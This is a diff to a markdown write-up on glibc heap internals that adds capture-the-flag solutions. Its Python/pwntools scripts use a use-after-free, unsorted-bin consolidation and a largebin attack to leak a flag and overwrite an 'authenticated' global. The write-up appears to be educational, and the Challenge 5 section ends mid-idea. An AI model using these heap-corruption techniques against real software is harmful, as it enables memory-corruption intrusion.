@@ -73,10 +73,7 @@ Doubly linked lists, binds of size up to 1024 bytes. Fast access, yet capable of
 
 ### Fastbin Consolidation
 
-If the smallbins couldn't perform the allocation (`> 1024 bytes`), we'd consolidate the fastbins and try to perform the allocation from there. \
-But how can we consolidate, if fastbins doesn't sets the `P` bit? We'd go through all fastbins, and clear the corresponding `P` bit, which would allow consolidation of fastbins to occur. \
-By doing so, we'd prevent fragmentation of small chunks within the fastbins. \
-This consolidation of fastbins can occur not only by `malloc(>1024)`, but also when `free` occurs - if a chunk is freed around `~65 KB` in size. \
+If the smallbins couldn't perform the allocation (`> 1024 bytes`), we'd consolidate the fastbins and try to perform the allocation from there. But how can we consolidate, if fastbins doesn't sets the `P` bit? We'd go through all fastbins, and clear the corresponding `P` bit, which would allow consolidation of fastbins to occur. By doing so, we'd prevent fragmentation of small chunks within the fastbins. This consolidation of fastbins can occur not only by `malloc(>1024)`, but also when `free` occurs - if a chunk is freed around `~65 KB` in size. \
 Notice that this stage only sets the `P` bit of the various fastbins. It does NOT means that the chunks WILL get consolidated, but only signals that they CAN be consolidated. 
 
 ### Unsorted bin
@@ -184,8 +181,262 @@ The best resource is [shellphish-how2heap][shellphish], organized to libc versio
 
 ## Challenge 1
 
+We can now perform allocations of up to `0x400` bytes, hence not adequate for any largebin exploitation. \
+This challenge involves a `malloc, free, puts, read_flag` menu. This means we can easily leak heap addresses by `free`ing a chunk and calling `puts`, reading its metadata. Moreover, the `read_flag` handler allocates a large buffer within the heap (`>0x400 bytes`), and writes the flag there. We have 2 main approaches for obtaining the arbtirary read:
+
+1. Cause the allocation to actually be performed to an address we control. This is possible, as the `free` handler doesn't nullifies the pointer upon reclamation, and `puts` doesn't checks if a slot is really being allocated before accessing it.
+
+2. After the allocation was already made, forge an arbitrary read. This may be challenging, as we have no write-vuln at all (we can malloc and free and read chunks values as we wish, but never overwrite fields to content we control).
+
+Hence, my idea is to create a funny state within the heap, such that small chunks would be consolidated, and the `read_flag` request would be performed off an known address that have been consolidated. \
+We should be able to perform consolidation from both fastbins, as well as the unsortedbin. 
+
+```python
+def malloc(p, index, size):
+    p.sendline(b'malloc')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Size: ')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'quit): ')
+
+def free(p, index):
+    p.sendline(b'free')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'quit): ')
+
+def puts(p, index):
+    p.sendline(b'puts')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(index).encode())
+    p.recvuntil(b'Data: ')
+    output = p.recvuntil(b'quit): ')
+    return output
+
+def read_flag(p):
+    p.sendline(b'read_flag')
+    p.recvuntil(b'quit): ')
+    
+def exploit():    
+    p = process(BINARY)
+
+    # Tcache allocations
+    tcache_bin_size = 7
+    size = 0x300
+    for i in range(tcache_bin_size):
+        malloc(p, i, size)
+    
+    # Allocate chunks to reside within the unsortedbin
+    first_unsorted_chunk_index = tcache_bin_size
+    second_unsorted_chunk_index = first_unsorted_chunk_index + 1
+    malloc(p, first_unsorted_chunk_index, size)
+    malloc(p, second_unsorted_chunk_index, size)
+
+    # Guard allocation - prevent top_chunk consolidation
+    guard_alloc_index = second_unsorted_chunk_index + 1
+    malloc(p, guard_alloc_index, size)
+
+    # Fill tcache
+    for i in range(tcache_bin_size):
+        free(p, i)
+
+    # Put a chunk in the unsortedbin
+    free(p, first_unsorted_chunk_index)
+    # Cause consolidation, to create large chunk within the unsortedbin!
+    free(p, second_unsorted_chunk_index)
+
+    # Trigger allocation from the chunk that was just consolidated
+    read_flag(p)
+
+    # Leak its content, using the read UAF
+    flag = puts(p, first_unsorted_chunk_index)
+    log.info(f'Got flag: {flag}')
+
+    p.interactive()
+```
+
+Notice another possible solution route is to use fastbins consolidation instead. It would be abit more challenging though, as their consolidation is stored within the smallbins (usually), and only `malloc` requests of above `0x400` bytes (or `free` of a chunk larger than `65 KB`) would trigger the fastbins consolidation.
+
+## Challenge 2
+
+Now we can perform allocations with `malloc` of up to size `0x420`, yet completely unbounded for `calloc`. \
+The thing is, there is actually 1 surprise large allocation before allocating the flag's buffer. We can bypass this in multiple approaches:
+
+1. Just add more free chunks within the unsortedbin, that would get consolidated. Notice, however, that while the first surprise allocation would be performed at the exact address as the first unsorted chunk, the second (real flag allocation) wouldn't necessarily be allocated on the second unsortedbin chunk address, and it actually depends on the flag allocation size. If we would carefully craft the unsortedbin chunks consolidation, such that it would create a free chunk of EXACTLY size `flag_chunk * 2`, we would be able to deterministicly know the address of the second allocation. It may be achieved in case we would store 4 freed chunks within the unsorted bin, all having a size of `flag_chunk / 2`.  
+
+2. Another, simpler approach, is to use the fact we can issue `calloc` with unbounded size. We can make sure it would exactly match the surprise allocation, hence - the second allocation would be performed right from the known unsortedbin chunks addresses. 
+
+The following script implements the second idea:
+
+```python
+def exploit():
+    p = process(BINARY)
+    flag_size = 0x590
+
+    # Tcache allocations
+    tcache_bin_size = 7
+    size = 0x400
+    for i in range(tcache_bin_size):
+        malloc(p, i, size)
+    
+    # Allocate chunks to reside within the unsortedbin
+    calloc_chunk_index = tcache_bin_size
+    calloc(p, calloc_chunk_index, flag_size)
+
+    unsorted_chunks_count = 2
+    unsorted_index = calloc_chunk_index + 1
+    for i in range(unsorted_index, unsorted_index + unsorted_chunks_count):
+        malloc(p, i, size)
+
+    # Guard allocation - prevent top_chunk consolidation
+    malloc(p, i + 1, size)
+
+    # Fill tcache
+    for i in range(tcache_bin_size):
+        free(p, i)
+
+    # Put chunks in the unsortedbin, and cause consolidation for them
+    free(p, calloc_chunk_index)    
+
+    for i in range(unsorted_index, unsorted_index + unsorted_chunks_count):
+        free(p, i)
+
+    # Trigger allocation from the chunk that was just consolidated
+    read_flag(p)
+
+    # Leak flag content (first unsorted chunk resides at index of tcache size)
+    flag = puts(p, unsorted_index)
+    log.info(f'Got flag: {flag}')
+
+    p.interactive()
+```
+
+## Challenge 3
+
+This time there's no unbounded size `calloc` call. However, there's an extra - `malloc` is actually constraint to a minimal size of `0x420`. Moreover, the flag's chunk this time is pretty small - `0x28c`, and there are 9 surprise allocations. \
+My idea is simple - forge a large chunk within the unsortedbin that would be exactly adequate for all surprise allocations, and its preceding chunk in memory - shall match the flag's chunk. 
+
+```python
+def exploit():
+    p = process(BINARY)
+    flag_size = 0x28c
+    surprise_alloc_count = 9
+    flag_chunk_size = chunk_size(flag_size)
+    large_unsorted_size = (surprise_alloc_count * flag_chunk_size) - 0x10
+    log.info(f'large_unsorted_size: {hex(large_unsorted_size)}')
+
+    size = 0x420
+    unsorted_index = 0
+    # Unsorted bin chunks - exactly enough for surprise allocations + flag chunk
+    malloc(p, unsorted_index, large_unsorted_size)
+    malloc(p, unsorted_index + 1, size)
+
+    # Guard allocation - prevent top_chunk consolidation
+    malloc(p, unsorted_index + 2, size)
+
+    # Put chunks in the unsortedbin, and cause consolidation for them
+    free(p, unsorted_index)
+    free(p, unsorted_index + 1)
+
+    # Trigger allocation from the chunk that was just consolidated
+    read_flag(p)
+
+    # Leak flag content (first unsorted chunk resides at index of tcache size)
+    flag = puts(p, unsorted_index + 1)
+    log.info(f'Got flag: {flag}')
+
+    p.interactive()
+```
+
+## Challenge 4
+
+Now the `malloc` handler is limited to allocations of at least `3000` bytes. Moreover, this handler keeps track of the requested size by each `malloc` invocation, storing it within a dedicated stack buffer (there might be OOB vuln for the indices, as there are only 8 slots within that buffer, and 16 available slots for allocations..). A `safe_read` handler is introduced, which reads from `stdin` up to the stored size within that stack buffer. Hence, it actually serves as a write primitive into the chunk's content, without any OOB-access. \
+There's also a `send_flag` handler, which checks if certain global is set, and if so - opens and prints the flag. This means our goal is to obtain arbitrary write primitive, so that we would be able to overwrite the `authenticated` global. \ 
+There are few cool ideas we can perform in order to pwn this scenario. However, I find the [largebin-attack][largebin-attack] as the most adequate for this case. Recall largebins are working with size ranges, instead of constant bin sizes. This attack tricks the value of `p->bk_nextsize`, which is the next larger chunk, possibly with another range. The idea is based on the following code snippet within glibc sources:
+
+```c
+victim_index = largebin_index (size);
+bck = bin_at (av, victim_index);
+fwd = bck->fd;
+
+if (fwd != bck)
+{
+    /* Or with inuse bit to speed comparisons */
+    size |= PREV_INUSE;
+    /* if smaller than smallest, bypass loop below */
+    assert (chunk_main_arena (bck->bk));
+    if ((unsigned long) (size)
+		< (unsigned long) chunksize_nomask (bck->bk))
+        {
+            fwd = bck;
+            bck = bck->bk;
+
+            victim->fd_nextsize = fwd->fd;
+            victim->bk_nextsize = fwd->fd->bk_nextsize;
+            fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
+        }
+...
+}
+```
+
+Notice that initially `bck` actually points to the large **bin** address, not any chunk within. `fwd` points to the first chunk within that bin, or to the same bin address in case the bin is empty (as the bin's `fd, bk` are initialized to itself). The idea is because the largebins are sorted by largest chunk to smallest chunk within certain memory range, in case we'd add a chunk that is smaller than the last chunk within a bin, no need to scan the whole bin - just add it within the bin's end. \
+Since we have a UAF, we can overwrite both chunks `p1` and `p2`. Recall `fwd->fd == p1`. The following two lines make the arbitrary write possible:
+
+```c
+victim->bk_nextsize = fwd->fd->bk_nextsize;
+/* fwd->fd->bk_nextsize = */ victim->bk_nextsize->fd_nextsize = victim;
+```
+
+Hence, by overwriting to `fwd->fd->bk_nextsize == [p1 + 0x28]`, we can control `addr = victim->bk_nextsize`. The allocator writes to `addr->fd_nextsize == [addr + 0x20]` the value of `p2`, hence we'd choose `addr = target - 0x20`. \
+Hence, we shall write: `[p1 + 0x18] = target - 0x20` (`0x18` because I assume we write to the start of the chunk's data, not metadata). 
+
+```python
+def exploit():
+    p = process(BINARY)
+    size = 0x2000
+
+    # Largebin Attack
+    malloc(p, 0, size + 0x28)         # large chunk
+    malloc(p, 15, size)               # guard alloc
+    malloc(p, 1, size + 0x18)         # large chunk, but smaller than first
+    malloc(p, 15, size)               # guard alloc
+    free(p, 0)                        # stores 0 within unsortedbin
+    malloc(p, 15, size + 0x38)        # move 0 to largebin
+    free(p, 1)                        # stores 1 within unsortedbin
+
+    # Arena leak
+    arena_leak = puts_addr(p, 0)
+    assert(len(arena_leak) == 6)
+    arena_leak = u64(arena_leak + b'\x00' * 2)
+    log.info(f'arena_leak: {hex(arena_leak)}')
+
+    # Overwrite large chunk's bk_nextsize
+    target = p.elf.symbols['authenticated']
+    buf = b''
+    buf += 2 * p64(arena_leak)  # Overwrite fd, bk
+    buf += b'A' * 8  # Overwrite fd_nextsize. Notice it doesn't crash. Otherwise, We'd have to leak heap addr first
+    buf += p64(target - 0x20)  # Overwite bk_nextsize 
+    safe_read(p, 0, buf)
+
+    malloc(p, 15, size + 0x38)        # move alloc-1 to largebin
+
+    p.sendline(b'send_flag')
+    p.interactive()
+```
+
+## Challenge 5
+
+Now the flag is loaded to some heap address prior to program's execution. We can execute malloc requests of at least `0x420`. But now there's no `safe_read`, but `read` handler, which means we can overflow writes, towards the metadata of their preceding chunks. \
+My initial idea is abit complex, but should work: we can create 2 tcache holes (`alloc(0, 3100), alloc(1, 3000), free(0), alloc(0, 3000) x 2`). By using the overwrite vulnerability, we can overwrite the `next` ptr of one of them, hence controlling the returned address upon new allocation. However, this allocation must be within the tcache, hence it won't be easily adequate for this case (as we can only call malloc larger than `0x420`). This makes the approach of exploitation solely by the tcache very tough. \
+A similar yet better approach is to exploit the fastbins instead. While we can still populate the fastbins as described for the tcache, upon allocation of more than `0x420` bytes, they are actually being consolidated into the unsorted bin!
+
+
+
+
 
 
 
 [shellphish]: https://github.com/shellphish/how2heap
 [glibc-all-in-one]: https://github.com/matrix1001/glibc-all-in-one
+[largebin-attack]: https://4xura.com/pwn/heap/large-bin-attack/
